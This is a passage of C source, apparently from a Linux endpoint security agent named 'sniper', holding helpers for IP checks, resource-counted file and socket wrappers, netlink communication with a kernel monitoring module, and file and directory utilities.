		return FALSE;
	}

	if (st1.st_ino != st0.st_ino) {
		/* 输入输出设备不同 */
		return FALSE;
	}

	return TRUE;
}

/* 不用strcasestr，避免编译警告 */
int istcp(char *proto)
{
	if (!proto) {
		return 0;
	}
	if (strchr(proto, 'T') || strchr(proto, 't')) {
		return 1;
	}
	return 0;
}
int isudp(char *proto)
{
	if (!proto) {
		return 0;
	}
	if (strchr(proto, 'U') || strchr(proto, 'u')) {
		return 1;
	}
	return 0;
}

int is_valid_ip(char *ip)
{
        int ip1 = 0, ip2 = 0, ip3 = 0, ip4 = 0, ret = 0;
        char str[8] = {0};

        if (!ip) {
                return 0;
        }

        ret = sscanf(ip, "%d.%d.%d.%d%1s", &ip1, &ip2, &ip3, &ip4, str);
        if (ret != 4 ||
            ip1 < 0 || ip1 > 254 ||
            ip2 < 0 || ip2 > 254 ||
            ip3 < 0 || ip3 > 254 ||
            ip4 < 0 || ip4 > 254) {
                return 0;
        }

        return 1;
}

int is_internet_ip(char *ip)
{
	int num = 0;
	int ip1 = 0, ip2 = 0, ip3 = 0, ip4 = 0;
	int ifip1 = 0, ifip2 = 0, ifip3 = 0, ifip4 = 0;

	if (!ip || ip[0] == 0) {
		return 0;
	}

	if (strcmp(ip, "127.0.0.1") == 0) {
		return 0;
	}

	/* 10.0.0.0/8, 192.168.0.0/16 */
	if (strncmp(ip, "10.", 3) == 0 ||
	    strncmp(ip, "192.168.", 8) == 0) {
		return 0;
	}

	/* 172.16.0.0/12： 172.16.0.0  ～172.31.255.255 */
	if (strncmp(ip, "172.", 4) == 0 && ip[6] == '.') {
		num = (ip[4] - '0') * 10 + ip[5] - '0';
		if (num >= 16 && num <= 31) {
			return 0;
		}
	}

	//TODO
	sscanf(ip, "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);
	sscanf(If_info.ip, "%d.%d.%d.%d", &ifip1, &ifip2, &ifip3, &ifip4);
	if (ip1 == ifip1 && ip2 == ifip2) {
		return 0;
	}

	return 1;
}


int check_isip(char *str)
{
	int ret = 0;
	int a = 0, b = 0, c = 0, d = 0;

	ret = sscanf(str, "%d.%d.%d.%d", &a, &b, &c, &d);
	if (ret == 4 && (a >= 0 && a <= 255) && (b >= 0 && b <= 255)
		&& (c >=0 && c <= 255) && (d >= 0 && d <= 255)) {
                return 1;
        } else {
                return 0;
        }

}

// sniper内存使用计数 ------>
int round_size(int size)
{
	int left = size % 16;

	if (left == 0) {
		return size;
	}

	return (size + 16 - left);
}

unsigned long snipermem[GETTYPE_MAX] = {0};

void *sniper_malloc(int size, int gettype)
{
	int real_size = round_size(size);
	char *buf = NULL;

	buf = malloc(real_size);
	if (!buf) {
		return NULL;
	}
	memset(buf, 0, real_size);

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		snipermem[gettype] += real_size;
	} else {
		snipermem[GETTYPE_MIN] += real_size;
	}

	return buf;
}

void do_sniper_free(void *buf, int size, int gettype)
{
	int real_size = round_size(size);

	if (!buf) {
		return;
	}

	/* 不安全，不要画蛇添足，如果size给错了，就会写越界 */
	//memset(buf, 0, real_size);

	free(buf);

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		snipermem[gettype] -= real_size;
	} else {
		snipermem[GETTYPE_MIN] -= real_size;
	}
}
// <------ sniper内存使用计数

// sniper打开文件计数 ------>
static unsigned long sniperfd[GETTYPE_MAX] = {0};

int sniper_open(char *path, int flags, int gettype)
{
	int fd = 0;

	if (!path) {
		return -1;
	}

	fd = open(path, flags);
	if (fd < 0) {
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fd;
}

int sniper_open_const(const char *path, int flags, int gettype)
{
	int fd = 0;

	if (!path) {
		return -1;
	}

	fd = open(path, flags);
	if (fd < 0) {
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fd;
}

int sniper_open_mode(char *path, int flags, mode_t mode, int gettype)
{
	int fd = 0;

	if (!path) {
		return -1;
	}

	fd = open(path, flags, mode);
	if (fd < 0) {
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fd;
}

int sniper_socket(int domain, int type, int protocol, int gettype)
{
	int fd = 0;

	fd = socket(domain, type, protocol);
	if (fd < 0) {
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fd;
}

int sniper_close(int fd, int gettype)
{
	int ret = 0;

	if (fd < 0) {
		return -1;
	}

	ret = close(fd);
	if (ret != 0) {
		MON_ERROR("close fd(%d) fail: %s\n", fd, strerror(errno));
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] --;
	} else {
		sniperfd[GETTYPE_MIN] --;
	}

	return 0;
}

FILE *sniper_fopen(char *path, char *mode, int gettype)
{
	FILE *fp = NULL;

	if (!path || !mode) {
		return NULL;
	}

	fp = fopen(path, mode);
	if (!fp) {
		return NULL;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fp;
}

FILE *sniper_fopen_const(const char *path, char *mode, int gettype)
{
	FILE *fp = NULL;

	if (!path || !mode) {
		return NULL;
	}

	fp = fopen(path, mode);
	if (!fp) {
		return NULL;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return fp;
}

int sniper_fclose(FILE *fp, int gettype)
{
	int ret = 0;

	if (!fp) {
		return -1;
	}

	ret = fclose(fp);
	if (ret != 0) {
		MON_ERROR("fclose fp(%#x) fail: %s\n", fp, strerror(errno));
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] --;
	} else {
		sniperfd[GETTYPE_MIN] --;
	}

	return 0;
}

void dump_sniperfd(void)
{
	int i = 0, fdsum = 0;

	for (i = GETTYPE_MIN; i < GETTYPE_MAX; i++) {
		fdsum += sniperfd[i];
	}

	if (fdsum < 100) {
		return;
	}

	INFO("open files: proc:%d, file:%d, net:%d, login:%d, info:%d, other:%d\n",
	     sniperfd[PROCESS_GET], sniperfd[FILE_GET], sniperfd[NETWORK_GET],
	     sniperfd[LOGIN_GET], sniperfd[INFO_GET], sniperfd[GETTYPE_MIN]);
}

void sniper_inc_opencount(int gettype)
{
	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}
}
void sniper_dec_opencount(int gettype)
{
	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] --;
	} else {
		sniperfd[GETTYPE_MIN] --;
	}
}

DIR *sniper_opendir(char *path, int gettype)
{
	DIR *dirp = NULL;

	if (!path) {
		return NULL;
	}

	dirp = opendir(path);
	if (!dirp) {
		return NULL;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] ++;
	} else {
		sniperfd[GETTYPE_MIN] ++;
	}

	return dirp;
}

int sniper_closedir(DIR *dirp, int gettype)
{
	int ret = 0;

	if (!dirp) {
		return -1;
	}

	ret = closedir(dirp);
	if (ret != 0) {
		MON_ERROR("close dirp(%#x) fail: %s\n", dirp, strerror(errno));
		return -1;
	}

	if (gettype > GETTYPE_MIN && gettype < GETTYPE_MAX) {
		sniperfd[gettype] --;
	} else {
		sniperfd[GETTYPE_MIN] --;
	}

	return 0;
}
// <------ sniper打开文件计数

// sniper防御相关 ------>
/* system(cmd) forks a child process, then child process does execl("/bin/sh", "sh", "-c", cmd, 0) */
int my_system(char *cmd, int print_mode)
{
	int status = 0, ret = 0;

	if (!cmd) {
		return -1;
	}

	errno = 0; //清理之前操作残留下的错误号

	status = system(cmd);
	if (status < 0) { //system本身失败，如fork失败
		if (print_mode != QUIET_MODE) {
			MON_ERROR("system(%s) fail: %s\n", cmd, strerror(errno));
		}
		return -1;
	}

	if (WIFEXITED(status)) { //命令进程正常结束
		ret = WEXITSTATUS(status);
		if (ret == 0) {  //命令执行成功
			if (print_mode == VERBOSE_MODE) {
				INFO("%s success\n", cmd);
				printf("%s success\n", cmd);
			}
			return 0;
		}

		if (print_mode == QUIET_MODE) {
			return -1;
		}

		if (ret == 127) {
			MON_ERROR("%s fail: retval 127. May bad command or bad /bin/sh\n", cmd);
		} else if (ret == 126) {
			MON_ERROR("%s fail: retval 126. May permission denied or command not executable\n", cmd);
		} else {
			MON_ERROR("%s fail: retval %d\n", cmd, ret);
		}
		if (errno != 0) {
			MON_ERROR("errno %d(%s)\n", errno, strerror(errno));
		}
		return -1;
	}

	if (WIFSIGNALED(status)) { //命令进程异常终止
		if (print_mode != QUIET_MODE) {
			MON_ERROR("%s terminated by signal(%d)\n", cmd, WTERMSIG(status));
		}
		return -1;
	}

	if (WIFSTOPPED(status)) { //命令进程处于暂停状态
		if (print_mode != QUIET_MODE) {
			MON_ERROR("%s stopped/hung by signal(%d)\n", cmd, WTERMSIG(status));
		}
		return -1;
	}

	/* 应该不会走到这里 */
	if (print_mode != QUIET_MODE) {
		MON_ERROR("system(%s) fail, status %d\n", cmd, status);
	}
	return -1;
}

/* 检查myip是否和ip或ip网段匹配 */
int ip_match(char *ip, char *myip)
{
	int ret = 0;
	unsigned int mask = 0, bits = 0;
	unsigned int ip1 = 0, ip2 = 0, ip3 = 0, ip4 = 0;
	unsigned int myip1 = 0, myip2 = 0, myip3 = 0, myip4 = 0;
	unsigned int addr = 0, myaddr = 0;

	if (!ip || !myip) {
		return 0;
	}

	if (strcmp(ip, myip) == 0) {
		return 1;
	}

	ret = sscanf(ip, "%d.%d.%d.%d/%d", &ip1, &ip2, &ip3, &ip4, &mask);
	if (ret != 5) {
		return 0;
	}
	bits = 32 - mask;
	addr = ((ip1 << 24) + (ip2 << 16) + (ip3 << 8) + ip4) >> bits;

	ret = sscanf(myip, "%d.%d.%d.%d", &myip1, &myip2, &myip3, &myip4);
	if (ret != 4) {
		return 0;
	}
	myaddr = ((myip1 << 24) + (myip2 << 16) + (myip3 << 8) + myip4) >> bits;

	if (addr == myaddr) {
		return 1;
	}

	return 0;
}

time_t my_uptime(void)
{
        FILE *fp = NULL;
        double upt = 0, idlet = 0;

        fp = sniper_fopen("/proc/uptime", "r", PROCESS_GET);
        if (!fp) {
                MON_ERROR("open /proc/uptime fail: %s\n", strerror(errno));
                return 0;
        }

        if (fscanf(fp, "%lf %lf", &upt, &idlet) < 0) {
                MON_ERROR("read /proc/uptime fail: %s\n", strerror(errno));
                sniper_fclose(fp, PROCESS_GET);
                return 0;
        }
        sniper_fclose(fp, PROCESS_GET);

        return (time_t)upt;
}
// <------ sniper防御相关

// sniper内核相关 ------>
int netlinknum = 0;
int get_netlink_num(void)
{
	FILE *fp = NULL, *pfp = NULL;
	char buf[S_LINELEN] = {0};
	char line[S_LINELEN] = {0};
	char path[S_PROCPATHLEN] = {0};
	char comm[16] = {0}; //S_COMMLEN
	int num = 0, pid = 0, group = 0;
	int old_sniper_netlink = 0, sniper_netlink = 0;

	fp = sniper_fopen("/proc/sys/sniper/netlink", "r", OTHER_GET);
	if (fp) {
		fscanf(fp, "%d", &netlinknum);
		sniper_fclose(fp, OTHER_GET);
	}
	if (netlinknum > 0) {
		return netlinknum;
	}

	fp = sniper_fopen("/proc/net/netlink", "r", OTHER_GET);
	if (fp) {
		while (fgets(buf, sizeof(buf), fp)) {
			if (sscanf(buf, "%*s %d %d %d %*s", &num, &pid, &group) != 3) {
				continue;
			}

			if (NETLINK_SNIPER == num) {
				sniper_netlink = 1;
			} else if (OLD_NETLINK_SNIPER == num) {
				old_sniper_netlink = 1;
			}

			if (group == SNIPER_MAGIC) {
				netlinknum = num;
				break;
			}

			if (pid <= 0) {
				continue;
			}

			snprintf(path, sizeof(path), "/proc/%d/status", pid);
			pfp = sniper_fopen(path, "r", OTHER_GET);
			if (pfp) {
				fgets(line, sizeof(line), pfp);
				sniper_fclose(pfp, OTHER_GET);

				sscanf(line, "Name: %15s", comm);
				if (strcmp(comm, SNIPER_NAME) == 0) {
					netlinknum = num;
					break;
				}
			}
		}
		sniper_fclose(fp, OTHER_GET);
	}

	if (netlinknum > 0) {
		return netlinknum;
	}

	if (old_sniper_netlink) {
		netlinknum = OLD_NETLINK_SNIPER;
		return netlinknum;
	}
	if (sniper_netlink) {
		netlinknum = NETLINK_SNIPER;
		return netlinknum;
	}
	return -1;
}

/* 主进程在起工作线程之前调用prepare_netlink_socket()初始化与内核通信的netlink socket，
   因此这里没法为nlsock[1~3]填kexec_msg/kfile_msg/knet_msg线程的真实进程号 */
static int get_nlsock(int seq)
{
	int sockfd = 0;
	struct sockaddr_nl src_addr = { 0 };

	sockfd = socket(PF_NETLINK, SOCK_RAW, netlinknum);
	if (sockfd < 0) {
		MON_ERROR("nlsock fail: %s\n", strerror(errno));
		return -1;
	}

	src_addr.nl_family = AF_NETLINK;
	src_addr.nl_pid = getpid() + seq;
	src_addr.nl_groups = SNIPER_MAGIC;

	if (bind(sockfd, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
		MON_ERROR("nlsock[%d] bind fail: %s\n", seq, strerror(errno));
		close(sockfd);
		return -1;
	}

	return sockfd;
}

#define NLSOCKNUM 5
static int nlsock[NLSOCKNUM] = { -1, -1, -1, -1, -1 };
void prepare_netlink_socket(void)
{
	int i = 0, flags = 0;
	char info[NLSOCKNUM][32] = {
		"set monitor strategy",
		"monitor process operations", //for kexec_msg
		"monitor file operations",    //for kfile_msg
		"monitor network operations", //for knet_msg
		"monitor virus operations"    //for kvirus_msg
	};

	for (i = 0; i < NLSOCKNUM; i++) {
		/* get_nlsock()失败了不需要重试3次，没有意义，还是会失败 */
		nlsock[i] = get_nlsock(i);
		if (nlsock[i] < 0) {
			// TODO 报告依赖日志
			MON_ERROR("prepare nlsock[%d] fail, can not %s\n", i, info[i]);
			continue;
		}

		/* 正规的做法是先F_GETFD，再F_SETFD flags|FD_CLOEXEC
		   但实际上不取也无妨，因为get_nlsock()里socket的时候本来就没有设置flag */
		flags = fcntl(nlsock[i], F_GETFD);
		if (flags < 0) {
			INFO("get nlsock[%d] flags fail: %s\n", i, strerror(errno));
		}

		/* 令system/popen/exec的子进程不继承netlink socket，
		   以免sniper进程退出了，netlink socket仍被占用，导致sniper_edr模块无法卸载 */
		flags |= FD_CLOEXEC;
		if (fcntl(nlsock[i], F_SETFD, flags) < 0) {
			MON_ERROR("set nlsock[%d] flags %#x fail: %s\n", i, flags, strerror(errno));
		}
	}
}

void close_netlink_socket(void)
{
	int i = 0;

	for (i = 0; i < NLSOCKNUM; i++) {
		if (nlsock[i] >= 0) {
			close(nlsock[i]);
		}
	}
}

#define SNIPER_ENGINE_OFF 0
#define SNIPER_ENGINE_ON  1
static int turn_engine(int type, struct nlmsghdr *nlh, int sockfd, int action)
{
	struct msghdr msg = {0};
	struct iovec iov = {0};

	nlh->nlmsg_len = NLMSGLEN;
	if (action == SNIPER_ENGINE_ON) {
		nlh->nlmsg_pid = getpid() + type - NLMSG_REG;
	} else {
		nlh->nlmsg_pid = 0;
	}
	nlh->nlmsg_flags = 0;
	nlh->nlmsg_type = type;

	iov.iov_base = (void *)nlh;
	iov.iov_len = nlh->nlmsg_len;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (sendmsg(sockfd, &msg, 0) < 0) {
		MON_ERROR("sendmsg into kernel fail: %s\n", strerror(errno));
		return -1;
	}

	return 0;
}

int init_engine(int type, struct nlmsghdr *nlh)
{
	int socki = type - NLMSG_REG;
	int sockfd = 0;

	if (!nlh) {
		MON_ERROR("init_engine fail: null nlh\n");
		return -1;
	}
	if (type < NLMSG_REG || type > NLMSG_MAXENGINE) {
		MON_ERROR("init engine fail: bad type %x\n", type);
		return -1;
	}

	sockfd = nlsock[socki];
	if (sockfd < 0) {
		MON_ERROR("init engine %x fail: no nlsock\n", type);
		return -1;
	}

	if (turn_engine(type, nlh, sockfd, SNIPER_ENGINE_ON) < 0) {
		MON_ERROR("turn engine %x on fail\n", type);
		return -1;
	}

	return 0;
}

void fini_engine(int type, struct nlmsghdr *nlh)
{
	int socki = type - NLMSG_REG;
	int sockfd = 0;

	if (!nlh) {
		return;
	}
	if (type < NLMSG_REG || type > NLMSG_MAXENGINE) {
		MON_ERROR("init engine fail: bad type %x\n", type);
		return;
	}

	sockfd = nlsock[socki];
	if (sockfd < 0) {
		return;
	}

	if (turn_engine(type, nlh, sockfd, SNIPER_ENGINE_OFF) < 0) {
		MON_ERROR("turn engine %x off fail\n", type);
	}
}

char *get_req(struct nlmsghdr *nlh, int type)
{
	struct timeval timeout = {3, 0};
	struct iovec iov = {0};
	struct msghdr msg = {0};
	int socki = type - NLMSG_REG;
	int sockfd = 0;

	if (!nlh) {
		MON_ERROR("get_req fail, NULL nlh\n", nlh);
		return NULL;
	}
	if (socki < 0 || socki > NLSOCKNUM) {
		MON_ERROR("get_req fail, bad socki %d\n", socki);
		return NULL;
	}

	sockfd = nlsock[socki];
	if (sockfd < 0) {
		MON_ERROR("get_req fail, bad nlsock[%d] %d\n", socki, sockfd);
		return NULL;
	}

	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

	memset(nlh, 0, NLMSGLEN);

	iov.iov_base = (void *)nlh;
	iov.iov_len = NLMSGLEN;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (recvmsg(sockfd, &msg, 0) < 0) {
		return NULL;
	}

	return NLMSG_DATA(nlh);
}

int send_data_to_kern(int type, char *data, int datalen)
{
#if 0
	struct iovec iov = {0};
	struct msghdr msg = {0};
	struct nlmsghdr *nlh = NULL;
	int size = NLMSG_LENGTH(datalen);

	if (!data) {
		MON_ERROR("send_data_to_kern: null data\n");
		return -1;
	}

	if (datalen == 0) {
		MON_ERROR("send_data_to_kern: type %d datalen 0\n", type);
		return -1;
	}

	nlh = (struct nlmsghdr *)malloc(size);
	if (!nlh) {
		MON_ERROR("send_data_to_kern: null nlh\n");
		return -1;
	}
	memset(nlh, 0, size);

	nlh->nlmsg_len = size;
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = 0;
	nlh->nlmsg_type = type;
	memcpy(NLMSG_DATA(nlh), data, datalen);

	iov.iov_base = (void *)nlh;
	iov.iov_len = nlh->nlmsg_len;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	if (sendmsg(nlsock[0], &msg, 0) < 0) {
		MON_ERROR("sendmsg into kernel fail: %s\n", strerror(errno));
		free(nlh);
		return -1;
	}

	free(nlh);
#else
	// NOTE(luoyinhong): disabled in ebpf mode
#endif

	return 0;
}
// <------ sniper内核相关

int prepare_rulefile(char *rule, int size, char *desc, struct rulefile_info *rfinfo)
{
	int fd = 0, ret = 0;

	if (!rule || !desc || !rfinfo) {
		return -1;
	}
	if (size > 10485760) {
		MON_ERROR("skip create %s rulefile, size %d > 10M\n", desc, size);
		return -1;
	}

	if (access(SNIPER_TMPDIR, F_OK) != 0) {
		mkdir(SNIPER_TMPDIR, 0755);
	}

	rfinfo->size = size;
	snprintf(rfinfo->path, PATH_MAX, "%s/%s.%lu", SNIPER_TMPDIR, desc, time(NULL));

	fd = open(rfinfo->path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
	if (fd < 0) {
		MON_ERROR("create rulefile %s fail: %s\n", rfinfo->path, strerror(errno));
		return -1;
	}

	ret = write(fd, rule, size);
	close(fd);

	if (ret < 0) {
		MON_ERROR("write rulefile %s fail: %s\n", rfinfo->path, strerror(errno));
		return -1;
	}

	if (ret != size) {
		MON_ERROR("write rulefile %s fail, should be %d, but only %d\n", rfinfo->path, size, ret);
		return -1;
	}

	return 0;
}

/*
 * 从一行中取key的名字和value的值
 * key: 存key的名字。key_len: key的空间大小。value: 存key的值。value_len: value的空间大小
 * delim: key和value之间的分割符，如'='、':'、' '等
 * 返回0，成功。-1，失败
 */
int get_key_value_from_line(char *line, char *key, int key_len, char *value, int value_len, char delim)
{
	char *ptr = NULL, *leftkey = NULL, *rightval = NULL;

	if (!line || !key || !value) {
		return -1;
	}

	ptr = strchr(line, delim);
	if (!ptr) {
		return -1;
	}
	*ptr = 0; //将line分成leftkey和rightval两段

	leftkey = skip_headspace(line);
	delete_tailspace(leftkey);
	snprintf(key, key_len, "%s", leftkey);

	rightval = skip_headspace(ptr+1);
	delete_tailspace(rightval);
	snprintf(value, value_len, "%s", rightval);

	return 0;
}

/*
 * 如果行中的key是要查找的，取value的值
 * key: 要查找的关键字。key_len: key的空间大小。value: 存key的值。value_len: value的空间大小
 * delim: key和value之间的分割符，如'='、':'、' '等
 * 返回0，成功。-1，失败
 */
int get_value_of_key_from_line(char *line, char *key, char *value, int value_len, char delim)
{
	char *ptr = NULL, *leftkey = NULL, *rightval = NULL;

	if (!line || !key || !value) {
		return -1;
	}

	ptr = strchr(line, delim);
	if (!ptr) {
		return -1;
	}
	*ptr = 0; //将line分成leftkey和rightval两段

	leftkey = skip_headspace(line);
	delete_tailspace(leftkey);
	if (strcmp(leftkey, key) != 0) {
		return -1;
	}

	rightval = skip_headspace(ptr+1);
	delete_tailspace(rightval);
	snprintf(value, value_len, "%s", rightval);

	return 0;
}

/*
 * 从文件中取key的value值
 * path: 文件路径。key: 要查找的关键字。value: 存key的值。value_len: value的空间大小
 * delim: key和value之间的分割符，如'='、':'、' '等
 * 返回0，成功。-1，失败
 */
int get_value_of_key_from_file(char *path, char *key, char *value, int value_len, char delim)
{
	int ret = -1;
	FILE *fp = NULL;
	char line[S_LINELEN] = {0};

	if (!path || !key || !value) {
		return -1;
	}

	fp = fopen(path, "r");
	if (!fp) {
		return -1;
	}

	while (fgets(line, sizeof(line), fp)) {
		if (get_value_of_key_from_line(line, key, value, value_len, delim) == 0) {
			ret = 0;
			break;
		}
	}
	fclose(fp);

	return ret;
}

/* 递归删除目录及目录下的文件 */
int remove_dir(char *dir)
{
	DIR *dirp = NULL;
	struct dirent *fdent = NULL;
	struct stat st = {0};
	char path[PATH_MAX] = {0};
	int ret = 0;

	if (!dir) {
		return -1;
	}

	dirp = sniper_opendir(dir, FILE_GET);
	if (dirp == NULL) {
		return -1;
	}

	while ((fdent = readdir(dirp)) != NULL) {
		if (strcmp(fdent->d_name, ".") == 0 ||
		    strcmp(fdent->d_name, "..") == 0) {
			continue;
		}

		snprintf(path, sizeof(path), "%s/%s", dir, fdent->d_name);
		if (lstat(path, &st) < 0) {
			ret = -1;
			break;	
		}

		/* 如果子文件是目录，继续递归删除 */
		if (S_ISDIR(st.st_mode)) {
			if(remove_dir(path) < 0) {
//				printf("remove_dir failed:%s\n", path);
				ret = -1;
				break;
			}
		}

		if (remove(path) < 0) {
//			printf("remove failed:%s\n", path);
			ret = -1;
			break;
		}
	}

	sniper_closedir(dirp, FILE_GET);
	return ret;
}

/*
 * 比较带有通配符的字符串，支持通配符*
 * 返回值：1，匹配
 *         0，不匹配
 */
int wildcard_string_match(char *pattern, char *string)
{
	int len1 = 0, len2 = 0;
	char *ptr = NULL;

	if (!pattern || !string) {
		return 0;
	}

	ptr = strchr(pattern, '*');
	if (!ptr) {			//no *
		if (strcmp(pattern, string) == 0) {
			return 1;
		}
		return 0;
	}

	if (ptr == pattern) {		// *yyy
		len1 = strlen(pattern) - 1;
		len2 = strlen(string);
		if (len2 < len1) {	//string比pattern短
			return 0;
		}
		if (strcmp(string+len2-len1, pattern+1) == 0) { //以yyy结尾
			return 1;
		}
		return 0;
	}

	if (*(ptr+1) == 0) {		// xxx*
		len1 = strlen(pattern) - 1;
		if (strncmp(string, pattern, len1) == 0) { //以xxx开头
			return 1;
		}
		return 0;
	}

	/* xxx*yyy */
	len1 = ptr - pattern; //xxx的长度
	if (strncmp(string, pattern, len1) == 0) { //以xxx开头
		ptr++;
		len1 = strlen(ptr); //yyy的长度
		len2 = strlen(string);
		if (strcmp(string+len2-len1, ptr) == 0) { //以yyy结尾
			return 1;
		}
	}

	return 0;
}

/* 计算目录空间的大小,单位是字节 */
unsigned long get_dir_size(char *dir)
{
	DIR *dirp = NULL;
	struct dirent *fdent = NULL;
	struct stat st = {0};
	char path[PATH_MAX] = {0};
	unsigned long child_dirsize = 0;
	unsigned long dirsize = 0;

	if (!dir) {
		return 0;
	}

	dirp = sniper_opendir(dir, FILE_GET);
	if (dirp == NULL) {
		DBG2(DBGFLAG_VIRUS, "open path %s failed!:%s\n", path, strerror(errno));
		return 0;
	}

	while ((fdent = readdir(dirp)) != NULL) {
		if (strcmp(fdent->d_name, ".") == 0 ||
		    strcmp(fdent->d_name, "..") == 0) {
			continue;
		}

		snprintf(path, sizeof(path), "%s/%s", dir, fdent->d_name);
		if (lstat(path, &st) < 0) {
			DBG2(DBGFLAG_VIRUS, "lstat path %s failed!:%s\n", path, strerror(errno));
			continue;	
		}

		/* 如果子文件是目录，继续递归计算 */
		if (S_ISDIR(st.st_mode)) {
			child_dirsize = get_dir_size(path);
			if(child_dirsize == 0) {
				continue;	
			}
			dirsize += child_dirsize;
		} else {
			dirsize += st.st_size;
		}

	}
	sniper_closedir(dirp, FILE_GET);

	return dirsize;
}

/* 计算路径所在分区的剩余空间大小,单位是字节 */
unsigned long get_path_disk_size(char *path)
{
	unsigned long free = 0;
	struct statfs stat;

	memset(&stat, 0, sizeof(struct statfs));
	if (statfs(path, &stat) < 0) {
		return 0;
	}

	free = (unsigned long)stat.f_bsize * (unsigned long)stat.f_bfree;
	return free;
}

/* 记录库的版本号到指定文件当中 */
void save_lib_version(char *name, char *version)
{
	FILE *fp = NULL;

	fp = fopen(name, "w+");
	if (!fp) {
		DBG2(DBGFLAG_TASK, "open file:%s failed:%s\n", name, strerror(errno));
		return;
	}

	fprintf(fp, "%s", version);
	fclose(fp);

	return;
}
